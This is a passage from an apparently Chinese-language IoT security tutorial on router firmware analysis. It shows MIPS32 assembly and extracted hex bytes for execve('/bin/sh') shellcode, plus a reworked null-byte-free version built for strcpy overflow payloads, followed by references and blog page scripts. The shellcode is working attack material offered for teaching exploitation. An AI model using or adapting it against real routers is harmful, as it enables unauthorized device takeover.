+    syscall
+variables:
+    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
+</code></pre><p>.section .text代表为代码段；.globl shellcode_execve代表程序主函数入口根据shellcode_execve标识；.set noreorder与流水线机制相关，为了代码被重新编排故加上本句宏。</p>
+<p>shellcode_execve使用jal指令，这将会把alpha的运行时地址存入\$ra中，目的为能够动态定位到variables标识的地址初，避免不同运行环境下的不同地址问题，也被称为代码重定位技术。而nop一句为流水线机制留空。addiu \$a0,\$ra,20为定位到variables，\$ra运行时为alpha的地址，而mips32为risc，指令为定长4字节，可以计算出到该字符串的距离4x5=20,接着就是参数2，3设置，现设置为NULL。最后完成调用号为4011（execve）的系统调用，最后紧跟/bin/sh字符串。</p>
+<p>编译并链接使用如下指令，同样用到交叉编译工具buildroot。</p>
+<pre><code>tophant@debian:~/buildroot/output/host/usr/bin$ ./mips-linux-as /home/tophant/IOT/source/shellcode_execve.S -o /home/tophant/IOT/source/shellcode_execve.o
+tophant@debian:~/buildroot/output/host/usr/bin$ ./mips-linux-ld /home/tophant/IOT/source/shellcode_execve.o -o /home/tophant/IOT/source/shellcode_execve
+./mips-linux-ld: warning: cannot find entry symbol __start; defaulting to 00000000004000d0
+</code></pre><p><img src="/2017/09/27/路由器固件安全分析技术-一/14982071275093.png" alt=""></p>
+<p>该mips32汇编编写已结被成功运行。现在需要将编写的shellcode提取出来。首先通过readelf读取节头表。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982071625103.png" alt=""></p>
+<p>可以看到起始于0x4000d0，大小为0x30。进入ida在反汇编窗口找到对应位置，单击0x4000d0，进入hex-view。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982072171339.png" alt=""></p>
+<p>灰色区域就是待提取的shellcode。</p>
+<pre><code>E0 FF BD 27 37 00 10 0c 00 00 00 00 14 00 E4 27
+00 00 05 24 00 00 06 24 AB 0F 02 24 0C 00 00 00
+2F 62 69 6E 2F 73 68 00 00 00 00 00 00 00 00 00
+</code></pre><p>例如存在使用strcpy的溢出漏洞，完整的payload将会被\x00截断，故需要将\x00坏字符剔除。</p>
+<pre><code>\x37\x00\x10\x0c    jal alpha
+\x00\x00\x00\x00    nop
+\x14\x00\xe4\x27    addiu \$sp,\$sp,-32
+\x00\x00\x05\x24    li \$a1,0
+\x00\x00\x06\x24    li \$a2,0
+</code></pre><p>如上汇编指令均需要被调整为不带\x00的指令。</p>
+<pre><code>.section .text
+.globl __start
+.set noreorder
+__start:
+    addiu \$sp,\$sp,-32
+alpha2:
+    li \$a2, 0x1111
+    bltzal \$a2, alpha2
+    lui \$a1, 0x101
+alpha:
+    addiu \$a0,\$ra,1025
+    addiu \$a0,\$a0,-1001
+    slti \$a1, \$zero, -1
+    slti \$a2, \$zero, -1
+    li \$v0,4011
+    syscall 0x1111
+variables:
+    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
+</code></pre><p>根据参考，jal alpha调整为li \$a2,0x1111;bltzal \$a2,alpha2这样保证alpha在当前调整链接的上方不会因为payload长度原因导致跳转高8位为0x00。</p>
+<p>nop指令在x86下为\x90，而在mips32下为\x00\x00\x00\x00，所以使用不影响payload运行的无效指令替代nop，lui \$a1,0x0101。</p>
+<p>\x14\x00\xe4\x27一句中可以看到低2字节和调整堆栈位置大小有关。所以通过先加一个16进制的3位数，再相应前去对应大小即可，同时保证不含\x0001103。如addiu \$a0,\$ra,1025，addiu \$a0,\$a0,-1001。</p>
+<p>li \$a1,0调整为slti \$a1,\$zero,-1,因为0寄存器总小于1，\$a1一定会被置为0。同理调整 li \$a2,0为slti \$a2,\$zero,-1。</p>
+<p>最后，重构payload需要调整重定位的偏移。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982072686950.png" alt=""></p>
+<p>可以观察到所有的\x00都被剔除了。至此以\x00为坏字符的修正过程完毕。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982072916043.png" alt=""></p>
+<p>以上均是shellcode的编写技术的基础概览，在实际运用中还需要根据特定条件进行一定的转换。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>揭秘家用路由器0day漏洞挖掘技术——吴少华<br>详细的路由器漏洞分析环境搭建教程——伐秦<br>Reported Vulnerability - D-Link routers authenticate administrative access using specific User-Agent string</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+      
+        <div id="donation_div"></div>
+
+<script src="/js/vdonate.js"></script>
+<script>
+var a = new Donate({
+  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+  btnText: 'Donate', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'https://raw.githubusercontent.com/iTimeTraveler/iTimeTraveler.github.io/site/source/about/donate/images/WeChanQR.png',
+  alipayImage: 'https://raw.githubusercontent.com/iTimeTraveler/iTimeTraveler.github.io/site/source/about/donate/images/AliPayQR.jpg'
+});
+</script>
+      
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/09/27/路由器固件安全分析技术-二/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          路由器固件安全分析技术(二)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/27/ARM-exploitation-for-IoT-–-Episode-1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">ARM exploitation for IoT – Episode 1</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#搭建环境篇"><span class="nav-number">2.</span> <span class="nav-text">搭建环境篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA-pro"><span class="nav-number">2.1.</span> <span class="nav-text">IDA pro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Binwalk"><span class="nav-number">2.2.</span> <span class="nav-text">Binwalk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#qemu"><span class="nav-number">2.3.</span> <span class="nav-text">qemu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#交叉编译环境"><span class="nav-number">2.4.</span> <span class="nav-text">交叉编译环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统环境网络配置"><span class="nav-number">2.5.</span> <span class="nav-text">系统环境网络配置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#指令分析篇"><span class="nav-number">3.</span> <span class="nav-text">指令分析篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#寄存器"><span class="nav-number">3.1.</span> <span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见指令"><span class="nav-number">3.2.</span> <span class="nav-text">常见指令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mips32指令编码类型"><span class="nav-number">3.2.1.</span> <span class="nav-text">mips32指令编码类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#算术类"><span class="nav-number">3.2.2.</span> <span class="nav-text">算术类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#load-store类"><span class="nav-number">3.2.3.</span> <span class="nav-text">load/store类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跳转指令"><span class="nav-number">3.2.4.</span> <span class="nav-text">跳转指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分支跳转指令"><span class="nav-number">3.2.5.</span> <span class="nav-text">分支跳转指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#syscall"><span class="nav-number">3.2.6.</span> <span class="nav-text">syscall</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#特性"><span class="nav-number">3.3.</span> <span class="nav-text">特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寻址方式"><span class="nav-number">3.3.1.</span> <span class="nav-text">寻址方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内存表示方法"><span class="nav-number">3.3.2.</span> <span class="nav-text">内存表示方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流水线特性"><span class="nav-number">3.3.3.</span> <span class="nav-text">流水线特性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后门分析篇"><span class="nav-number">4.</span> <span class="nav-text">后门分析篇</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用基础篇"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用基础篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本溢出原理"><span class="nav-number">5.1.</span> <span class="nav-text">基本溢出原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本payload编写方法"><span class="nav-number">5.2.</span> <span class="nav-text">基本payload编写方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">6.</span> <span class="nav-text">参考资料</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2017 物联网安全技术研究 All Rights Reserved.
+          
+            <span id="busuanzi_container_site_uv">
+              本站访客数<span id="busuanzi_value_site_uv"></span>人次  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var contentdiv = document.getElementById("content");
+
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/主页" class="mobile-nav-link">Home</a>
+  
+    <a href="/书籍" class="mobile-nav-link">books</a>
+  
+    <a href="/工具" class="mobile-nav-link">tools</a>
+  
+    <a href="/关于我们" class="mobile-nav-link">about</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
